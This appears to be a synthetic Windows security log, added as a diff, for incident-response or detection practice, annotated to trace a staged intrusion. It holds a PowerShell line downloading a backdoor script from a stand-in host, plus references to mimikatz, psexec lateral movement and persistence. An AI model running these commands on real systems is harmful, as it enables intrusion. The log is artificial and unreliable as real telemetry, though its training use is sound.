@@ -1,0 +1,64 @@
+2025-08-20 07:42:01 [Auth] EventID=4624 User=alice SourceIP=192.168.1.10 Status=Success
+2025-08-20 07:44:12 [Auth] EventID=4625 User=bob SourceIP=192.168.1.15 Status=Failure
+2025-08-20 07:45:32 [Sysmon] chrome.exe started by alice
+2025-08-20 07:47:01 [Sysmon] outlook.exe started by alice
+2025-08-20 08:10:55 [Auth] EventID=4624 User=service_account SourceIP=192.168.1.50 Status=Success
+2025-08-20 09:00:03 [Auth] EventID=4625 User=Unknown SourceIP=45.77.21.55 Status=Failure # failed brute-force
+2025-08-20 09:05:41 [Sysmon] powershell.exe CommandLine=Get-ChildItem -Error Path=\\ Failed to execute
+2025-08-20 09:06:19 [Sysmon] mimikatz.exe started by bob — terminated instantly # failed attempt
+2025-08-21 07:55:22 [Auth] EventID=4624 User=charlie SourceIP=192.168.1.20 Status=Success
+2025-08-21 07:57:45 [Sysmon] teams.exe started by charlie
+2025-08-21 08:15:31 [Auth] EventID=4625 User=david SourceIP=192.168.1.25 Status=Failure
+2025-08-21 08:17:42 [Auth] EventID=4624 User=david SourceIP=192.168.1.25 Status=Success
+2025-08-21 08:20:03 [Sysmon] firefox.exe started by david
+2025-08-22 09:10:12 [Auth] EventID=4625 User=Unknown SourceIP=212.102.33.77 Status=Failure # random scanning IP
+2025-08-22 09:12:40 [Auth] EventID=4625 User=Unknown SourceIP=212.102.33.77 Status=Failure
+2025-08-22 09:30:55 [Auth] EventID=4624 User=alice SourceIP=192.168.1.10 Status=Success
+2025-08-23 08:05:00 [Sysmon] winword.exe started by alice
+2025-08-23 08:12:42 [Sysmon] calc.exe started by charlie
+2025-08-23 09:01:33 [Auth] EventID=4624 User=bob SourceIP=192.168.1.15 Status=Success
+2025-08-23 09:15:11 [Auth] EventID=4625 User=bob SourceIP=192.168.1.15 Status=Failure
+2025-08-24 07:45:02 [Auth] EventID=4624 User=alice SourceIP=192.168.1.10 Status=Success
+2025-08-24 07:47:19 [Auth] EventID=4625 User=bob SourceIP=192.168.1.15 Status=Failure
+2025-08-24 07:49:55 [Sysmon] chrome.exe started by alice
+2025-08-24 08:10:33 [Auth] EventID=4624 User=charlie SourceIP=192.168.1.20 Status=Success
+2025-08-24 08:12:00 [Sysmon] outlook.exe started by charlie
+2025-08-25 09:00:01 [Auth] EventID=4625 User=service_account SourceIP=192.168.1.30 Status=Failure
+2025-08-25 09:01:45 [Auth] EventID=4624 User=service_account SourceIP=192.168.1.30 Status=Success
+2025-08-25 09:15:23 [Sysmon] word.exe started by alice
+2025-08-25 10:00:50 [Auth] EventID=4625 User=david SourceIP=192.168.1.25 Status=Failure
+2025-08-26 08:14:11 [Auth] EventID=4624 User=david SourceIP=192.168.1.25 Status=Success
+2025-08-26 08:45:20 [Sysmon] excel.exe started by david
+2025-08-27 08:01:12 [Auth] EventID=4624 User=alice SourceIP=192.168.1.10 Status=Success
+2025-08-27 08:15:42 [Auth] EventID=4625 User=bob SourceIP=192.168.1.15 Status=Failure
+2025-08-27 09:00:12 [Auth] EventID=4625 User=Unknown SourceIP=192.168.1.100 Status=Failure # Recon
+2025-08-27 09:05:14 [Auth] EventID=4625 User=Unknown SourceIP=192.168.1.101 Status=Failure # Recon
+2025-08-27 09:15:30 [Auth] EventID=4625 User=Unknown SourceIP=192.168.1.102 Status=Failure # Recon
+2025-08-27 09:20:12 [Auth] EventID=4624 User=AttackerAdmin SourceIP=192.168.1.100 Status=Success # Initial compromise
+2025-08-27 09:22:05 [Sysmon] powershell.exe CommandLine=Invoke-WebRequest http://maliciousserver.com/backdoor.ps1 # Backdoor download
+2025-08-27 09:23:00 [Sysmon] backdoor.exe CommandLine=/silent /install # Persistence
+2025-08-27 09:45:22 [Auth] EventID=4672 User=AttackerAdmin SourceIP=192.168.1.100 Privilege=Admin granted
+2025-08-28 09:00:00 [Sysmon] psexec.exe Target=PC02 Remote execution
+2025-08-28 09:05:00 [Sysmon] psexec.exe Target=PC03 Remote execution
+2025-08-28 09:10:00 [Sysmon] psexec.exe Target=PC04 Remote execution
+2025-08-28 09:15:12 [Auth] EventID=4672 Remote session PC02 established
+2025-08-28 09:20:12 [Auth] EventID=4672 Remote session PC03 established
+2025-08-28 09:25:12 [Auth] EventID=4672 Remote session PC04 established
+2025-08-28 10:41:00 [SIEM] ALERT Multiple failed login attempts detected for Admin account PC01
+2025-08-28 10:42:15 [SIEM] ALERT Suspicious backdoor.exe process detected
+2025-08-28 10:43:30 [SIEM] ALERT Unusual Kerberos ticket requests by AttackerAdmin
+2025-08-28 10:45:00 [Auth] EventID=4740 User=AttackerAdmin Account locked
+2025-08-28 10:46:10 [Sysmon] Event 5 Process terminated: backdoor.exe
+2025-08-28 10:47:22 [FW01] ALERT Blocked outbound connection 203.0.113.55
+2025-08-28 10:48:45 [Auth] EventID=4768 User=AttackerAdmin Ticket revoked
+2025-08-28 10:50:00 [Auth] EventID=4672 Remote session PC02 terminated
+2025-08-28 10:52:00 [Auth] EventID=4672 Remote session PC03 terminated
+2025-08-30 08:05:22 [Auth] EventID=4625 User=Unknown SourceIP=198.51.100.33 Status=Failure # failed brute-force
+2025-08-30 08:06:10 [Sysmon] rundll32.exe CommandLine=BadScript.dll — crashed immediately # failed attempt
+2025-09-01 07:55:44 [Auth] EventID=4624 User=bob SourceIP=192.168.1.15 Status=Success
+2025-09-02 09:12:08 [Sysmon] explorer.exe started by david
+2025-09-03 09:45:19 [Auth] EventID=4624 User=alice SourceIP=192.168.1.10 Status=Success
+2025-09-04 10:05:50 [Sysmon] outlook.exe started by charlie
+2025-09-05 08:10:12 [Auth] EventID=4624 User=david SourceIP=192.168.1.25 Status=Success
+2025-09-06 09:20:43 [Auth] EventID=4625 User=Unknown SourceIP=192.0.2.77 Status=Failure
+2025-09-07 09:32:15 [Sysmon] excel.exe started by alice
